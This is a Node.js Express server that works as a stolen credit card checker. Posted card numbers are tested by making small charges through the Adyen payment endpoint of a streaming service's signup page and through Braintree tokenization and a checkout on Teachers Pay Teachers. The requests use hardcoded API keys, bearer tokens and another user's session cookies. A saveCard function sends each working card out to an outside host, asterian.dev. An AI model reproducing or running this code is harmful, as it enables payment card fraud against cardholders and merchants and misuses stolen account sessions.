const adyenEncrypt = require('node-adyen-encrypt')(25)
const fetch = require('node-fetch')
const query = require('readline-sync');
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require("axios");
const fs = require('fs');

const app = express();
const port = process.env.PORT || 3000;
process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';

app.use(cors());
app.use(bodyParser.json());

app.get('/', (req, res) => {
  res.send("Hello there, welcome from Stripe 2 Request API.")
});

function adyen(list) {
  var regex = new RegExp("^\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$")
  if (regex.test(list)) {
    return ('Invalid Format')
  } else {
    console.log('Processing the card')
  }
  var list = list.split("|")
  var cc = list[0]
  var mm = list[1]
  var yy = list[2] < 50 ? "20" + list[2] : list[2]
  var cvc = list[3]

  var key = "10001|C9552E35949AFB903F2DFC88A87728D6FAABE805D63D354063D39E6A1C21A7A47BBF8806AB544EEDDA8A1B167667892BEE3C7F198A87522A888003EB5D74A2AE7B118EA1209A269234F30B5BC3E6F4E125D92405C3CFD7FB6D4A8AC86435B0B3D7E8FB58FF4234FDB163B3B85609CFB6A1985C2F25859F5564F29894F415375A40B90F6FB78B2E9F003EC506EA7DC3FA6FFD3657B018F53C20C1E53E7EE16F75B402EA3439CB2D894F109112D5DB845877E7730518CB761AAC7E201DE60CC2AE12686D0EC43B3D39E0D1A2413ED6369B5D83F6CBAF1118DA9AAA1EF86DE53DA05724614FC40679C10AD99F62EB0C0D9E589FFF2B72AB9A2B4807F97C99A108AB"
  var options = {};
  var generationtime = new Date().toISOString()
  const cardData = {
    number: cc,
    cvc: cvc,
    holderName: "John Doe",
    expiryMonth: mm,
    expiryYear: yy,
    generationtime: generationtime
  };
  var cseInstance = adyenEncrypt.createEncryption(key, options);
  var ecc = cseInstance.encrypt(cardData);
  var emm = cseInstance.encrypt(cardData);
  var eyy = cseInstance.encrypt(cardData);
  var ecvc = cseInstance.encrypt(cardData);

  return fetch("https://wuxfdb4hkd.execute-api.us-west-2.amazonaws.com/throttled/pureflix-AdyenPayments-prod", {
    "headers": {
      "accept": "application/json, text/plain, */*",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      "content-type": "application/json;charset=UTF-8",
      "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\"",
      "sec-ch-ua-mobile": "?0",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "cross-site",
      "x-api-key": "JSOPMsTlAS73D2SmBtcFsrtFVwbhwxX4iEkBNC22"
    },
    "referrer": "https://signup.pureflix.com/signup/payment",
    "referrerPolicy": "no-referrer-when-downgrade",
    "body": `{\"paymentMethod\":{\"type\":\"scheme\",\"encryptedCardNumber\":\"${ecc}\",\"encryptedSecurityCode\":\"${ecvc}\",\"encryptedExpiryMonth\":\"${emm}\",\"encryptedExpiryYear\":\"${eyy}\",\"holderName\":\"Joy\",\"billingAddress\":{\"city\":\"NA\",\"country\":\"US\",\"houseNumberOrName\":\"NA\",\"postalCode\":\"10080\",\"stateOrProvince\":\"NA\",\"street\":\"NA\"}},\"returnUrl\":\"https://signup.pureflix.com/signup/payment\",\"mpxUserId\":\"https://euid.theplatform.com/idm/data/User/NwFqg_Qft4_jzwX1/732275945\",\"shopperEmail\":\"joycameintoyourpussy@gmail.com\"}`,
    "method": "POST",
    "mode": "cors"
  })
    .then(response => response.json())
    .then(data => {
      return {
        "Status": data.resultCode,
        "Reason": data.refusalReason,
        "Additional": data.additionalData,
      }
    })
    .catch((error) => {
      return error;
    });
}

async function btfirst(cc) {
  const ccNum = cc.split("|")[0];
  const ccMonth = cc.split("|")[1];
  const ccYear = cc.split("|")[2];
  const ccCvc = cc.split("|")[3];
  var data = JSON.stringify({
    "clientSdkMetadata": {
      "integration": "dropin2",
      "sessionId": "bb8b4919-0104-44e5-9e50-b8999442bbe9",
      "source": "client"
    },
    "operationName": "TokenizeCreditCard",
    "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
    "variables": {
      "input": {
        "creditCard": {
          "cvv": ccCvc,
          "expirationMonth": ccMonth,
          "expirationYear": ccYear,
          "number": ccNum
        },
        "options": {
          "validate": false
        }
      }
    }
  });

  var config = {
    method: 'post',
    url: 'https://payments.braintree-api.com/graphql',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
      'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2MzE2NDA2MTIsImp0aSI6IjAzNzQwYmM0LTgwMTgtNDQ3Ny1iMmYyLTQ1NDA1NjVhNmE0MiIsInN1YiI6IjdjbTRjZDI4cm1tczY1NXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjdjbTRjZDI4cm1tczY1NXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJjdXN0b21lcl9pZCI6IjE5OTU1MzMzNjIifX0.F6trmdD2liCKCzUq4fXUYgCpPrJ8GZUPXNXoHuJmcfo7JTmlEX72bXV5ph4QWfjIQ2R8YqLvtb6ObDXpzApr2g?customer_id=',
      'Braintree-Version': '2018-05-10',
      'Content-Type': 'application/json'
    },
    data: data
  };

  return await axios(config)
    .then(({ data }) => { return data })
    .catch(e => { return e.response.data; })

}
async function btsecond(token) {
  var data = JSON.stringify({
    "extensions": {},
    "operationName": "CartCheckout",
    "query": "mutation CartCheckout($nonce: String, $firstName: String, $lastName: String, $address: String, $address2: String, $city: String, $state: String, $country: String, $countryId: ID, $postalCode: String, $saveAddress: Boolean, $salesTaxEstimate: String) {\n  member {\n    cartCheckout(input: {paymentMethodNonce: $nonce, billingData: {address: {firstName: $firstName, lastName: $lastName, address: $address, address2: $address2, city: $city, state: $state, country: $country, countryId: $countryId, postalCode: $postalCode}, saveAddressToAccount: $saveAddress}, taxData: {estimateClientReported: $salesTaxEstimate}}) {\n      order {\n        ...CheckoutOrderFields\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment CheckoutOrderFields on Order {\n  id\n  totalAmount\n  taxAmount\n  fee\n  orderItems {\n    itemId\n    totalAmount\n    subtotalAmount\n    price\n    quantity\n    licenseCount\n    product {\n      id\n      name\n      subjects {\n        name\n        __typename\n      }\n      author {\n        id\n        __typename\n      }\n      resourceProperties {\n        isAvailableForDigital\n        isSellerPublishedDigital\n        __typename\n      }\n      itemType\n      types {\n        name\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n",
    "variables": {
      "address": "36 Regent St",
      "address2": "",
      "city": "Jamestown",
      "country": "United States",
      "countryId": 223,
      "firstName": "Quentin",
      "lastName": "Gonus",
      "nonce": token,
      "postalCode": "14701",
      "salesTaxEstimate": 0,
      "saveAddress": true,
      "state": "NY"
    }
  });

  var config = {
    method: 'post',
    url: 'https://www.teacherspayteachers.com/graph/graphql?opname=CartCheckout',
    headers: {
      'x-csrf-token': ' MDvuBtXT-2Qi0bjPNdrg3_aHPkjchGLUcSV0',
      'User-Agent': ' Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
      'x-requested-with': ' XMLHttpRequest',
      'Origin': ' https://www.teacherspayteachers.com',
      'Sec-Fetch-Site': ' same-origin',
      'Sec-Fetch-Mode': ' cors',
      'Sec-Fetch-Dest': ' empty',
      'Referer': ' https://www.teacherspayteachers.com/Cart/Checkout',
      'Cookie': ' ajs_anonymous_id=9af3af2c-5674-4939-8a37-cf22e9278eee; device=desktop; originalDevice=desktop; csrfToken=MDvuBtXT-2Qi0bjPNdrg3_aHPkjchGLUcSV0; optimizelyEndUserId=oeu1631554127367r0.40160949955716596; _gcl_au=1.1.42392555.1631554130; _gid=GA1.2.1374029864.1631554130; _ga=GA1.2.767016092.1631554130; _hp2_ses_props.3064244106=%7B%22ts%22%3A1631554129672%2C%22d%22%3A%22www.teacherspayteachers.com%22%2C%22h%22%3A%22%2F%22%7D; _hjid=2554ed8a-0460-4a85-9647-a43949b89aca; _hjFirstSeen=1; _hjIncludedInSessionSample=1; __ssid=dffe0654500a35b33d408492acdc4f7; TPT-AB-HASH=8daebe76db23541f78a1e3cea1f86dca; _pin_unauth=dWlkPU5XUmhObVF6Wm1ZdE9XVm1NQzAwWVdNeExXSmxaRFV0Wm1ZMll6RmtaVGRqWWpaag; _derived_epik=dj0yJnU9djlqUzBFNmJIR01hekd1VnpsY21MMjFNcUQ1eWRlVEMmbj1DdERSS2N3LWhLM0JwbG9LMy1DRjVnJm09MSZ0PUFBQUFBR0VfaW5ZJnJtPTEmcnQ9QUFBQUFHRV9pblk; TPT=uaelb84eaffpuidlhh2cfnrgb3; TPTC=uaelb84eaffpuidlhh2cfnrgb3; TPTU=19529932692f5a5cbe35ea80b6174c8acfff70; darklyUser=19529932%3A2; darklyNewLogin=1; custom_check_version=1; custom_check_c=g55BC989gKf9%2FT%2Fvsd2sDg%3D%3D; GAPI=eyJhbGciOiJFUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NfZXhwIjoxNjMxNjQwNjExLCJhdXRoX3RpbWUiOjE2MzE1NTQyMTEsImVtYWlsIjoicXVlbnRpbmdvbnVzQGdtYWlsLmNvbSIsImV4cCI6MTYzMTY0MDYxMSwiZ3JvdXAiOjIsImlhdCI6MTYzMTU1NDIxMSwiaXNfYWRtaW4iOmZhbHNlLCJpc3MiOiJodHRwczovL3d3dy50ZWFjaGVyc3BheXRlYWNoZXJzLmNvbSIsImp0aSI6IjNhYWYwMDRhLTNkMTUtNDY5Ny04NmIxLTEzNWRhYWEwMDRiYyIsInN1YiI6InVzZXI6MTk1Mjk5MzIiLCJ0eXAiOiJhY2Nlc3MiLCJ1c2VybmFtZSI6InF1ZW50aW4xNjMxNTU0MjEwOTE2IiwidmVyc2lvbiI6Mn0.AQdUlOCPcNJQul5WIltjBMak9fppmBy8O7pNP2AqhBK9Ea2CGLFrs-CZauYVkiyylf9SrodTTiN9q-qDdaZSf_XBAD7n6O15eXrcFXqrt1Tx90GUP1o5Vz_BueM33HeCPaRj1Sk5G0wKNn4WXR4gIHp87yTjE21yQmfBNJlyKCOeh1oM; _hp2_props.3064244106=%7B%22tAnonId%22%3A%229af3af2c-5674-4939-8a37-cf22e9278eee%22%2C%22isLoggedIn%22%3Atrue%7D; _uetsid=0f3253c014b811eca3da7f4b7ec60855; _uetvid=0f32774014b811ecae61dfc0599df17d; _hp2_id.3064244106=%7B%22userId%22%3A%223918382863261957%22%2C%22pageviewId%22%3A%222225023137021723%22%2C%22sessionId%22%3A%226766864760436004%22%2C%22identity%22%3A%2219529932%22%2C%22trackerVersion%22%3A%224.0%22%2C%22identityField%22%3Anull%2C%22isIdentified%22%3A1%7D; classfundSummary={%22active%22:true%2C%22isDraft%22:false%2C%22status%22:%22none%22%2C%22totalContributions%22:%22$0.00%22}; _hjAbsoluteSessionInProgress=1; _gat_UA-3293744-4=1; _tpt_api_key=',
      'Content-Type': 'application/json'
    },
    data: data
  };
  return await axios(config)
    .then(({ data }) => { return data })
    .catch(e => { return e.response.data; })

}
function reAddItem() {
  var data = JSON.stringify({
    "extensions": {},
    "operationName": "AddToCart",
    "query": "mutation AddToCart($licenseType: LicenseType!, $productId: ID!, $quantity: Int = 1, $searchToken: String, $recommendationsToken: String) {\n  cart {\n    addProduct(input: {licenseType: $licenseType, productId: $productId, quantity: $quantity, searchToken: $searchToken, recommendationsToken: $recommendationsToken}) {\n      licenseType\n      productId\n      quantity\n      product {\n        id\n        name\n        buyerData {\n          isAddedToCart\n          __typename\n        }\n        author {\n          id\n          sellerPixelId\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
    "variables": {
      "licenseType": "NON_TRANSFERABLE_LICENSE",
      "productId": "7094342",
      "quantity": 1,
      "recommendationsToken": "ChMxNzgwOTAyODcwOTk2NjY3MjU0EA0aI2hvbWUtcGFnZS1fcmVjb21tZW5kZV8xNTk0NTYzMTE5NTU4Ihdob21lLXBhZ2UtcnltbC11c2VyLXJlYygA"
    }
  });

  var config = {
    method: 'post',
    url: 'https://www.teacherspayteachers.com/graph/graphql?opname=AddToCart',
    headers: {
      'Host': ' www.teacherspayteachers.com',
      'x-csrf-token': ' MDvuBtXT-2Qi0bjPNdrg3_aHPkjchGLUcSV0',
      'sec-ch-ua-mobile': ' ?0',
      'User-Agent': ' Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
      'x-requested-with': ' XMLHttpRequest',
      'Origin': ' https://www.teacherspayteachers.com',
      'Sec-Fetch-Site': ' same-origin',
      'Sec-Fetch-Mode': ' cors',
      'Sec-Fetch-Dest': ' empty',
      'Referer': ' https://www.teacherspayteachers.com/Product/Types-of-Business-Ownership-Types-of-Business-Ownership-Word-Search-7094342?ref=hp-ryml&rt=ChMxNzgwOTAyODcwOTk2NjY3MjU0EA0aI2hvbWUtcGFnZS1fcmVjb21tZW5kZV8xNTk0NTYzMTE5NTU4Ihdob21lLXBhZ2UtcnltbC11c2VyLXJlYygA',
      'Cookie': ' ajs_anonymous_id=9af3af2c-5674-4939-8a37-cf22e9278eee; device=desktop; originalDevice=desktop; csrfToken=MDvuBtXT-2Qi0bjPNdrg3_aHPkjchGLUcSV0; optimizelyEndUserId=oeu1631554127367r0.40160949955716596; _gcl_au=1.1.42392555.1631554130; _gid=GA1.2.1374029864.1631554130; _ga=GA1.2.767016092.1631554130; _hjid=2554ed8a-0460-4a85-9647-a43949b89aca; __ssid=dffe0654500a35b33d408492acdc4f7; TPT-AB-HASH=8daebe76db23541f78a1e3cea1f86dca; _pin_unauth=dWlkPU5XUmhObVF6Wm1ZdE9XVm1NQzAwWVdNeExXSmxaRFV0Wm1ZMll6RmtaVGRqWWpaag; TPT=uaelb84eaffpuidlhh2cfnrgb3; TPTC=uaelb84eaffpuidlhh2cfnrgb3; TPTU=19529932692f5a5cbe35ea80b6174c8acfff70; darklyUser=19529932%3A2; darklyNewLogin=1; custom_check_version=1; custom_check_c=g55BC989gKf9%2FT%2Fvsd2sDg%3D%3D; GAPI=eyJhbGciOiJFUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NfZXhwIjoxNjMxNjQwNjExLCJhdXRoX3RpbWUiOjE2MzE1NTQyMTEsImVtYWlsIjoicXVlbnRpbmdvbnVzQGdtYWlsLmNvbSIsImV4cCI6MTYzMTY0MDYxMSwiZ3JvdXAiOjIsImlhdCI6MTYzMTU1NDIxMSwiaXNfYWRtaW4iOmZhbHNlLCJpc3MiOiJodHRwczovL3d3dy50ZWFjaGVyc3BheXRlYWNoZXJzLmNvbSIsImp0aSI6IjNhYWYwMDRhLTNkMTUtNDY5Ny04NmIxLTEzNWRhYWEwMDRiYyIsInN1YiI6InVzZXI6MTk1Mjk5MzIiLCJ0eXAiOiJhY2Nlc3MiLCJ1c2VybmFtZSI6InF1ZW50aW4xNjMxNTU0MjEwOTE2IiwidmVyc2lvbiI6Mn0.AQdUlOCPcNJQul5WIltjBMak9fppmBy8O7pNP2AqhBK9Ea2CGLFrs-CZauYVkiyylf9SrodTTiN9q-qDdaZSf_XBAD7n6O15eXrcFXqrt1Tx90GUP1o5Vz_BueM33HeCPaRj1Sk5G0wKNn4WXR4gIHp87yTjE21yQmfBNJlyKCOeh1oM; _hp2_props.3064244106=%7B%22tAnonId%22%3A%229af3af2c-5674-4939-8a37-cf22e9278eee%22%2C%22isLoggedIn%22%3Atrue%7D; classfundSummary={%22active%22:true%2C%22isDraft%22:false%2C%22status%22:%22none%22%2C%22totalContributions%22:%22$0.00%22}; _hp2_ses_props.3064244106=%7B%22ts%22%3A1631559589944%2C%22d%22%3A%22www.teacherspayteachers.com%22%2C%22h%22%3A%22%2F%22%7D; _hjIncludedInSessionSample=1; _hjAbsoluteSessionInProgress=0; Ti=a7a1f4d1-0b06-46b1-be00-39036c8284a6; _derived_epik=dj0yJnU9TG5rMXVwb0FOSVZWaHBGS0ZncDhfemtTNktoS3QyTWcmbj1MU0ZXZElqWmtlSV92bnNCQTRrS2hRJm09MSZ0PUFBQUFBR0Vfb2NrJnJtPTEmcnQ9QUFBQUFHRV9vY2s; _hjCachedUserAttributes=eyJhdHRyaWJ1dGVzIjp7fSwidXNlcklkIjoiMTk1Mjk5MzIifQ==; _hp2_id.3064244106=%7B%22userId%22%3A%223918382863261957%22%2C%22pageviewId%22%3A%226071143792166488%22%2C%22sessionId%22%3A%226260873301099747%22%2C%22identity%22%3A%2219529932%22%2C%22trackerVersion%22%3A%224.0%22%2C%22identityField%22%3Anull%2C%22isIdentified%22%3A1%7D; _dc_gtm_UA-3293744-4=1; _uetsid=0f3253c014b811eca3da7f4b7ec60855; _uetvid=0f32774014b811ecae61dfc0599df17d; _tpt_api_key=',
      'Content-Type': 'application/json'
    },
    data: data
  };
  axios(config)
    .then(({ data }) => { console.log("Added Data") })
    .catch(e => { console.log("Error. Cannot add to cart!") })

}

function saveCard(cc) {
  var data = JSON.stringify({
    "cvv": "CVV LIVE " + cc + " > Charged: 1 $ BrainTree"
  });

  var config = {
    method: 'post',
    url: 'asterian.dev/save.php',
    headers: {
      'Content-Type': 'application/json'
    },
    data: data
  };

  axios(config)
    .catch(err => {
      console.log(err);
    });

}

app.post('/cc', async (req, res) => {
  if (!req.body['cc']) {
    res.send({ error: true, message: "No CC Input" });
    return 0;
  }
  let result = await adyen(req.body['cc']);
  res.send(result);
});

app.post('/bt', async (req, res) => {
  if (!req.body['cc']) {
    res.send({ error: true, message: "No CC Input" });
    return 0;
  }
  if (req.body['cc'].split("|").length != 4) {
    res.send({ error: true, message: "Invalid CC Format" });
    return 0;
  }
  let result = await btfirst(req.body['cc']);
  result = await btsecond(result.data.tokenizeCreditCard.token);
  if (result['errors']) {
    res.send({
      cc: req.body['cc'],
      error: true,
      message: "Your card has been declined."
    })
  } else {
    reAddItem();
    saveCard(req.body['cc']);
    res.send({
      cc: req.body['cc'],
      error: false,
      message: "Charged : 1$"
    })
  }
});

app.listen(port, () => {
  console.log(`Server started on ${port}`);
})
